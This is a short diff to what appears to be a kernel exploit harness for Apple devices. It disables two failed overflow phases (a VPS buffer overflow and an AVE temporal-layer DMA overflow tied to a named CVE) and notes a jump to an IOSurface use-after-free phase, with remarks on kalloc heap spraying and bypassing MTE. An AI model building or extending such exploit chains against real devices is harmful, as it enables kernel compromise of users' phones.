@@ -21072,8 +21072,12 @@ new_modes:
          * generation on every frame. Try multiple pipe sizes to match
          * whatever kalloc zone the VPS buffer lands in.
          * ================================================================ */
-        if (rounds == 229 && r229_matched_idx >= 0) {
-            rlog("\n=== Phase 15: VPS Overflow (IDR-forced) ===\n");
+        /* SKIP Phases 15/16: confirmed dead (0 pipe corruption across all configs).
+         * Phase 15: VPS overflow -> bitstream buffer, not heap
+         * Phase 16: NTL DMA overflow -> IOKit DMA zone, not kalloc.data
+         * Jump directly to Phase 17 (IOSurface UAF exploitation). */
+        if (0 && rounds == 229 && r229_matched_idx >= 0) {
+            rlog("\n=== Phase 15: VPS Overflow (IDR-forced) [SKIPPED] ===\n");
             rlog("Match: spray[%d]\n", r229_matched_idx);
 
             /* 45s watchdog */
@@ -21336,8 +21340,8 @@ new_modes:
          * produce VPS output, the DMA mapping loop runs BEFORE encode
          * output, so even a failed encode may trigger the overflow.
          * ================================================================ */
-        if (rounds == 229) {
-            rlog("\n=== Phase 16 (r=229): AVE Temporal Layer DMA Overflow ===\n");
+        if (0 && rounds == 229) { /* SKIPPED: confirmed 0 corruption, crashes at NTL=10 */
+            rlog("\n=== Phase 16 (r=229): AVE Temporal Layer DMA Overflow [SKIPPED] ===\n");
             rlog("Target: CVE-2026-112705 via NumberOfTemporalLayers OOB\n");
             rlog("DMA bypasses MTE - no tag checks on coprocessor bus\n");
 
